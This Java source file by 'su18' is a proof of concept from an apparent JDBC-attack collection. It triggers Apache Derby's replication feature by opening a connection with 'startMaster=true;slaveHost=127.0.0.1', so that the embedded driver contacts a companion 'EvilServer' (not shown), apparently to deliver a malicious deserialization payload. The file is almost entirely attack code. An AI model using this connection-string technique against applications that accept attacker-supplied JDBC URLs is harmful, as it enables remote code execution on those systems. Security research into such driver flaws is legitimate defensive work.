package org.su18.jdbc.attack.derby;

import java.sql.DriverManager;

/**
 * 使用 org.su18.jdbc.attack.derby.EvilServer 进行测试
 * 依赖版本 10.10.1.1
 * 驱动名称 org.apache.derby.jdbc.EmbeddedDriver
 * 属性名 startMaster
 * 连接参数 startMaster=true;slaveHost=127.0.0.1（slavePort）
 *
 * @author su18
 */
public class AttackDerby {

	public static void main(String[] args) throws Exception {
		// 注册驱动
		Class.forName("org.apache.derby.jdbc.EmbeddedDriver");

		// 测试代码先初始化一下数据库
		DriverManager.getConnection("jdbc:derby:webdb;create=true");

		// 链接
		DriverManager.getConnection("jdbc:derby:webdb;startMaster=true;slaveHost=127.0.0.1");
	}

}
